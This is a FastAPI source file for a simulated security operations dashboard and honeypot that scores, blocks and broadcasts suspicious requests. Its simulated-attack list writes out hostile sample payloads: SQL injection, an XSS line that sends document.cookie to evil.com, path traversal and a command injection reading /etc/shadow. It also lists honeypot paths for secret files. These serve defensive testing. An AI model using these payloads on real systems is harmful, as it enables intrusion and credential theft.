import asyncio
import random
from contextlib import asynccontextmanager
from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect, Depends
from fastapi.responses import FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from sqlalchemy.orm import Session

from core.database import SessionLocal, ThreatEvent, BlockedIP, init_db
from core.analyzer import analyze_request
from core.ws_manager import ws_manager
from core.waf_generator import generate_waf_rules

def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()

@asynccontextmanager
async def lifespan(app: FastAPI):
    init_db()
    yield

app = FastAPI(title="AegisMesh Autonomous AI-SOC & Honeypot Engine", lifespan=lifespan)
app.mount("/static", StaticFiles(directory="static"), name="static")

GEO_NODES = [
    {"country": "Russia (Moscow)", "lat": 55.7558, "lon": 37.6173, "ip_prefix": "185.220.101."},
    {"country": "China (Beijing)", "lat": 39.9042, "lon": 116.4074, "ip_prefix": "223.5.5."},
    {"country": "USA (Ashburn)", "lat": 39.0438, "lon": -77.4874, "ip_prefix": "45.33.32."},
    {"country": "Germany (Frankfurt)", "lat": 50.1109, "lon": 8.6821, "ip_prefix": "195.201.10."},
    {"country": "Brazil (São Paulo)", "lat": -23.5505, "lon": -46.6333, "ip_prefix": "177.71.128."},
    {"country": "Netherlands (Amsterdam)", "lat": 52.3676, "lon": 4.9041, "ip_prefix": "94.142.241."},
    {"country": "South Korea (Seoul)", "lat": 37.5665, "lon": 126.9780, "ip_prefix": "211.234.12."}
]

SIMULATED_ATTACKS = [
    {"method": "GET", "path": "/api/v1/users", "query": "id=1' UNION SELECT username,password FROM admin--", "ua": "sqlmap/1.7.2", "trap": False},
    {"method": "GET", "path": "/.env", "query": "", "ua": "python-requests/2.31.0", "trap": True},
    {"method": "POST", "path": "/api/v1/comments", "query": "text=<script>fetch('http://evil.com/?c='+document.cookie)</script>", "ua": "Mozilla/5.0", "trap": False},
    {"method": "GET", "path": "/api/v1/files", "query": "file=../../../../etc/passwd", "ua": "Nikto/2.1.6", "trap": False},
    {"method": "GET", "path": "/api/v1/debug/keys", "query": "", "ua": "Gobuster/3.6", "trap": True},
    {"method": "POST", "path": "/api/v1/auth", "query": "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9_X9kLm2PqR8vT1wZ7yB4nM6cV3xS5aD8fG0hJ2kL4pQ7wE9rT1yU3iO5pA8sD", "ua": "curl/8.1.2", "trap": False},
    {"method": "GET", "path": "/api/v1/ping", "query": "host=8.8.8.8; cat /etc/shadow", "ua": "Nmap Scripting Engine", "trap": False}
]

async def record_and_broadcast_event(
    db: Session,
    source_ip: str,
    method: str,
    path: str,
    query: str,
    user_agent: str,
    is_honeypot: bool = False,
    geo_override: dict | None = None
):
    analysis = analyze_request(path, query, user_agent)
    if is_honeypot:
        analysis["is_malicious"] = True
        analysis["risk_score"] = 98
        analysis["severity"] = "CRITICAL"
        if "HONEYPOT_TRAP_TRIGGERED" not in analysis["threats"]:
            analysis["threats"].insert(0, "HONEYPOT_TRAP_TRIGGERED")
        if "CLEAN_TRAFFIC" in analysis["threats"]:
            analysis["threats"].remove("CLEAN_TRAFFIC")

    geo = geo_override or random.choice(GEO_NODES)
    waf_rule = generate_waf_rules(source_ip, analysis["threats"], path)

    auto_blocked = False
    if analysis["risk_score"] >= 75:
        existing_block = db.query(BlockedIP).filter(BlockedIP.ip_address == source_ip).first()
        if not existing_block:
            db.add(BlockedIP(ip_address=source_ip, reason=", ".join(analysis["threats"])))
            auto_blocked = True

    event = ThreatEvent(
        source_ip=source_ip,
        country=geo["country"],
        lat=geo["lat"],
        lon=geo["lon"],
        method=method,
        path=f"{path}?{query}" if query else path,
        threats=", ".join(analysis["threats"]),
        risk_score=analysis["risk_score"],
        severity=analysis["severity"],
        entropy=analysis["entropy"],
        payload_sample=analysis["payload_sample"],
        is_honeypot=is_honeypot,
        waf_rule=waf_rule
    )
    db.add(event)
    db.commit()
    db.refresh(event)

    payload = {
        "id": event.id,
        "source_ip": event.source_ip,
        "country": event.country,
        "lat": event.lat,
        "lon": event.lon,
        "method": event.method,
        "path": event.path,
        "threats": analysis["threats"],
        "risk_score": event.risk_score,
        "severity": event.severity,
        "entropy": event.entropy,
        "is_honeypot": event.is_honeypot,
        "waf_rule": event.waf_rule,
        "auto_blocked": auto_blocked,
        "timestamp": event.timestamp.strftime("%H:%M:%S")
    }
    await ws_manager.broadcast(payload)
    return payload

@app.get("/", include_in_schema=False)
def soc_dashboard():
    return FileResponse("templates/index.html")

@app.websocket("/ws/threats")
async def websocket_endpoint(websocket: WebSocket):
    await ws_manager.connect(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        ws_manager.disconnect(websocket)

@app.get("/api/telemetry")
def get_telemetry(db: Session = Depends(get_db)):
    events = db.query(ThreatEvent).order_by(ThreatEvent.id.desc()).limit(25).all()
    blocked = db.query(BlockedIP).order_by(BlockedIP.id.desc()).limit(20).all()
    return {
        "stats": {
            "total_threats": db.query(ThreatEvent).count(),
            "blocked_ips": db.query(BlockedIP).count(),
            "honeypot_hits": db.query(ThreatEvent).filter(ThreatEvent.is_honeypot == True).count()
        },
        "events": [
            {
                "id": e.id,
                "source_ip": e.source_ip,
                "country": e.country,
                "lat": e.lat,
                "lon": e.lon,
                "method": e.method,
                "path": e.path,
                "threats": e.threats.split(", "),
                "risk_score": e.risk_score,
                "severity": e.severity,
                "entropy": e.entropy,
                "is_honeypot": e.is_honeypot,
                "waf_rule": e.waf_rule,
                "timestamp": e.timestamp.strftime("%H:%M:%S")
            } for e in events
        ],
        "blocked": [{"ip": b.ip_address, "reason": b.reason} for b in blocked]
    }

@app.post("/api/simulate-attack")
async def simulate_red_team_burst(db: Session = Depends(get_db)):
    """5 eşzamanlı saldırı üretir ve hem WebSocket'e hem de doğrudan HTTP yanıtına döner."""
    generated = []
    for _ in range(5):
        geo = random.choice(GEO_NODES)
        fake_ip = f"{geo['ip_prefix']}{random.randint(10, 245)}"
        attack = random.choice(SIMULATED_ATTACKS)
        ev = await record_and_broadcast_event(
            db=db,
            source_ip=fake_ip,
            method=attack["method"],
            path=attack["path"],
            query=attack["query"],
            user_agent=attack["ua"],
            is_honeypot=attack["trap"],
            geo_override=geo
        )
        generated.append(ev)
        await asyncio.sleep(0.2)
    return {"status": "ok", "events": generated}

HONEYPOT_PATHS = ["/.env", "/wp-login.php", "/admin/config", "/api/v1/debug/keys", "/.git/config"]

@app.api_route("/{full_path:path}", methods=["GET", "POST", "PUT", "DELETE"], include_in_schema=False)
async def catch_all_honeypot(request: Request, full_path: str, db: Session = Depends(get_db)):
    path = "/" + full_path
    client_ip = request.client.host if request.client else "127.0.0.1"
    query = request.url.query
    user_agent = request.headers.get("user-agent", "Unknown")

    if any(trap in path.lower() for trap in HONEYPOT_PATHS):
        await asyncio.sleep(1.0)
        await record_and_broadcast_event(db, client_ip, request.method, path, query, user_agent, is_honeypot=True)
        return JSONResponse(
            status_code=200,
            content={
                "status": "debug_active",
                "db_host": "10.240.12.88",
                "aws_secret_hint": "AKIAIOSFODNN7EXAMPLE_DECOY_TRAP"
            }
        )

    await record_and_broadcast_event(db, client_ip, request.method, path, query, user_agent, is_honeypot=False)
    return JSONResponse(status_code=403, content={"detail": "AegisMesh Defense Shield: Request intercepted."})
